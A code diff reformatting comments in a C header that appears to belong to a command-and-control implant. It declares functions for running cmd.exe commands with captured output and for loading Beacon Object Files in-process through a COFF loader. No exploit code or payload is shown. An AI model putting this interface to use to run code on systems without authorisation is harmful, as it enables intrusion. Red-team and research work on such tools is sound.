@@ -3,45 +3,61 @@
 
 #include <stddef.h>
 
-// ---------------------------------------------------------------------------
-// Output buffer — shared across shell commands and BOF execution.
-// Initialised by shell_init(); freed by shell_cleanup().
-// ---------------------------------------------------------------------------
+/**
+ * @brief Initialise the output buffer and the COFF loader. Call once at startup.
+ * @return 0 on success, -1 on failure.
+ */
+int shell_init(void);
 
-// Allocate the output buffer. Call once at startup before any other shell_ call.
-// Returns 0 on success, -1 on allocation failure.
-int  shell_init(void);
-
-// Free the output buffer.
+/**
+ * @brief Free the output buffer and tear down the COFF loader.
+ */
 void shell_cleanup(void);
 
-// Current number of bytes written into the output buffer.
-int  shell_output_len(void);
+/**
+ * @return Number of bytes currently in the output buffer.
+ */
+int shell_output_len(void);
 
-// Pointer to the output buffer contents (not null-terminated).
+/**
+ * @return Pointer to the output buffer (not null-terminated).
+ */
 const char *shell_output_buf(void);
 
-// Reset the output buffer to empty (does not free memory).
+/**
+ * @brief Zero and reset the output buffer without freeing it.
+ */
 void shell_buf_reset(void);
 
-// Append data to the output buffer (used by BOF compatibility layer).
+/**
+ * @brief Append raw bytes to the output buffer. Used by the BOF compat layer.
+ * @param data Bytes to append.
+ * @param len  Number of bytes.
+ */
 void buf_append(const char *data, int len);
 
-// printf-style append into the output buffer.
+/**
+ * @brief printf-style write into the output buffer.
+ * @param fmt printf format string.
+ */
 void beacon_log(const char *fmt, ...);
 
-// ---------------------------------------------------------------------------
-// Command execution
-// ---------------------------------------------------------------------------
-
-// Execute a shell command via cmd.exe /c, capturing stdout and stderr into
-// the output buffer. Handles "cd" internally (updates the working directory).
+/**
+ * @brief Execute a shell command via cmd.exe /c, capturing stdout and stderr.
+ *        Handles "cd" internally to track the working directory.
+ * @param command Null-terminated command string.
+ */
 void execute_shell_command(const char *command);
 
-// Execute a compiled BOF in-process via COFFLoader.
-// bof_data / bof_size: the raw .obj bytes.
-// args / args_len:     packed BeaconPack argument buffer.
-int  execute_bof(unsigned char *bof_data, size_t bof_size,
-                 char *args, int args_len);
+/**
+ * @brief Load and execute a BOF in-process via the COFF loader.
+ * @param bof_data  Raw .obj bytes.
+ * @param bof_size  Size of bof_data in bytes.
+ * @param args      Packed BeaconPack argument buffer.
+ * @param args_len  Length of args in bytes.
+ * @return 0 on COFF_SUCCESS, 1 on any loader error.
+ */
+int execute_bof(unsigned char *bof_data, size_t bof_size,
+                char *args, int args_len);
 
-#endif // SHELL_H
+#endif /* SHELL_H */
